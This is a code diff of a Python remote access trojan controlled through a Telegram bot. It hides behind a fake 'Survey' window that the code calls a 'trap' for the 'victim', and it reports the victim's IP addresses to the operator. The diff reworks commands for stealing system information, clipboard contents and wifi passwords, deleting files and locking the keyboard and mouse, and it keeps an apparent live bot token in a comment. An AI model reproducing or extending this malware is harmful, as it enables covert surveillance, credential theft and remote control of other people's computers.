@@ -1,6 +1,6 @@
 import requests
-from os import chdir, getcwd
-from tkinter import Tk, Label, PhotoImage, messagebox
+from os import chdir, getcwd, remove
+from tkinter import Tk, Label, PhotoImage, messagebox, Toplevel
 cwd = getcwd()
 def check_internret():
     try:
@@ -22,11 +22,8 @@ if check_internret():
     keyboard = Hub.Keyboard()
     ip = requests.get("https://api.ipify.org/").text
     local_ip = os.Get_IP()
-    token = "6622962602:AAERgZlXugMGZIA5vqkIpv5KKAAsDUrA6is" # write your token
-    with open("Files/info.info", "r") as read:
-        telid = read.readlines()
-        telid = "".join(telid)
-    id = telid 
+    token = BOT_TOKEN # 6622962602:AAERgZlXugMGZIA5vqkIpv5KKAAsDUrA6is
+    id = TELEGRAM_ID
     commands = ["/check", 
                 "/sysinfo", 
                 "/get_clipboard", 
@@ -53,7 +50,6 @@ if check_internret():
                 "/show_warning",
                 "/voice",
                 "/dis_all",
-                "/ena_all",
                 "/chdir",
                 "/process",
                 "/chruns",
@@ -93,18 +89,18 @@ if check_internret():
                     try:
                         u = uname()
                         info = f"""IP: {ip}
-    Local IP: {local_ip}
-    System: {u[0]}
-    System Version: {u[2]}
-    OS Caption: {getoutput("wmic os get caption").replace(" ", "").replace("\n", "").replace("Caption", "")}
-    OS Architecture: {getoutput("wmic os get OSArchitecture").replace(" ", "").replace("\n", "").replace("OSArchitecture", "")}
-    Node: {u[1]}
-    Machine: {u[4]}
-    Time Zone: {tzname[0]}
-    User: {getuser()}
-    OS CPU: {getoutput("wmic cpu get name").replace("Name", "").replace(" ", "").replace("\n", "")}
-    CPU Cores: {getoutput("wmic cpu get numberofcores").replace("\n", "").replace("NumberOfCores", "").replace(" ", "")}
-    Firewall state: {getoutput("netsh advfirewall show publicprofile").replace("----------------------------------------------------------------------", "").replace("\n\n", "").replace(" ", "").split("\n")[1][-2:].lower()}"""
+Local IP: {local_ip}
+System: {u[0]}
+System Version: {u[2]}
+OS Caption: {getoutput("wmic os get caption").replace(" ", "").replace("\n", "").replace("Caption", "")}
+OS Architecture: {getoutput("wmic os get OSArchitecture").replace(" ", "").replace("\n", "").replace("OSArchitecture", "")}
+Node: {u[1]}
+Machine: {u[4]}
+Time Zone: {tzname[0]}
+User: {getuser()}
+OS CPU: {getoutput("wmic cpu get name").replace("Name", "").replace(" ", "").replace("\n", "")}
+CPU Cores: {getoutput("wmic cpu get numberofcores").replace("\n", "").replace("NumberOfCores", "").replace(" ", "")}
+Firewall state: {getoutput("netsh advfirewall show publicprofile").replace("----------------------------------------------------------------------", "").replace("\n\n", "").replace(" ", "").split("\n")[1][-2:].lower()}"""
                         state = send_msg(info)
                     except: send_msg("Error;")
                 if command == "/get_clipboard": 
@@ -174,7 +170,7 @@ if check_internret():
                     except: send_msg("Error;")
                 if command == "/connected_wifi":
                     try:
-                        ssid = getoutput('netsh wlan show interfaces').replace(" ", "").replace("Thereis1interfaceonthesystem:", "").replace("Hostednetworkstatus:Notavailable", "").replace("\n\n\n", "").split("\n")[6].replace("SSID:", "")
+                        ssid = getoutput('netsh wlan show interfaces').replace("", "").replace("Thereis1interfaceonthesystem:", "").replace("Hostednetworkstatus:Notavailable", "").replace("\n\n\n", "").split("\n")[6].replace("SSID:", "")
                         send_msg(ssid)
                     except: send_msg("Error;")
                 if command == "/wifi_password":
@@ -234,7 +230,7 @@ if check_internret():
                         os.Create_directory(name)
                         send_msg(f"{name} Directory is created.")
                     except: send_msg("Error;")
-                if command == "/rm":
+                if command == "/rm": 
                     try:
                         send_msg("write file name(in 10 seconds):")
                         sleep(10)
@@ -243,10 +239,10 @@ if check_internret():
                         sleep(10)
                         addr = read_msg()
                         if file != addr: 
-                            os.Remove_file(addr+file)
+                            remove(addr+file)
                             send_msg(f"{addr+file} is removed.")
                         else: 
-                            os.Remove_file(file)
+                            remove(file)
                             send_msg(f"{file} is removed.")
                     except: send_msg("Error;")
                 if command == "/create_file":
@@ -302,13 +298,17 @@ if check_internret():
                     try:
                         keyboard.Disable_keyboard()
                         mouse.Disable_mouse()
-                        send_msg("Mouse and Keyboard is disabled.")
-                    except: send_msg("Error;")
-                if command == "/ena_all":
-                    try:
+                        send_msg("how many seconds disable(write number in 8 seconds)?")
+                        sleep(8)
+                        try:
+                            num = int(read_msg())
+                        except: 
+                            send_msg("Invalid Input.")
+                            break
+                        sleep(num)
                         keyboard.Enable_keyboard()
                         mouse.Enable_mouse()
-                        send_msg("Mouse and Keyboard is enabled.")
+                        send_msg("Mouse and Keyboard is disabled.")
                     except: send_msg("Error;")
                 if command == "/chdir":
                     try:
@@ -350,30 +350,39 @@ if check_internret():
                     except: send_msg("Error;")
                 send_msg("click /pass")
                 sleep(5)
-    send_msg(f"Connected to victim at {strftime("%H : %M : %S")} with {ip} IP. Wait for closing the trap.")
-    print("Trap send")
+    send_msg(f"Connected to victim with {ip}(local: {local_ip}) at {strftime("%H:%M:%S")}(Wait for closing trap. write /commands for help).")
     from tkinter import * 
     root = Tk()
     Label(root, text="Write your name:", font=("", 15)).place(x=15, y=50)
     name = Entry(root, width=50)
     name.place(x=80, y=85)
-    def error(): root.destroy(), messagebox.showerror("Error", "We have an error. try again later!")
-    Button(root, text="Submit and start!", command=error).place(x=35, y=150)
+    def questions(): 
+        root.destroy()
+        questions = Tk()
+        Label(questions, text="What's your favorite sport?").place(x=15, y=15)
+        Entry(questions, width=50).place(x=25, y=35)
+        Label(questions, text="What's your favorite TV show?").place(x=15, y=55)
+        Entry(questions, width=50).place(x=25, y=75)
+        Label(questions, text="What's your favorite food?").place(x=15, y=95)
+        Entry(questions, width=50).place(x=25, y=115)
+        questions.title("questions")
+        questions.resizable(False, False)
+        questions.geometry("500x250")
+        questions.mainloop()
+    Button(root, text="Submit and start!", command=questions).place(x=35, y=150)
     root.title("Survey")
     root.geometry("500x200")
-    picture = PhotoImage(file = fr'{cwd}\MSTL\Files\icon.ico')
-    root.iconphoto(False, picture) 
+    # picture = PhotoImage(file = fr'{cwd}\MSTL\Files\icon.ico')
+    # root.iconphoto(False, picture) 
     root.resizable(False, False)
     root.mainloop()
-    send_msg(f"Victim closed trap at {strftime("%H : %M : %S")}. You are open to write commands(/commands for help).")
-    print("starting")
     start()
 else:
     root = Tk()
     Label(root, text="Check Your internet connection", font=("", 15)).pack()
     root.title("Survey")
     root.geometry("300x300")
-    picture = PhotoImage(file = fr'{cwd}\MSTL\Files\icon.ico')
-    root.iconphoto(False, picture) 
+    # picture = PhotoImage(file = fr'{cwd}\MSTL\Files\icon.ico')
+    # root.iconphoto(False, picture) 
     root.resizable(False, False)
     root.mainloop()
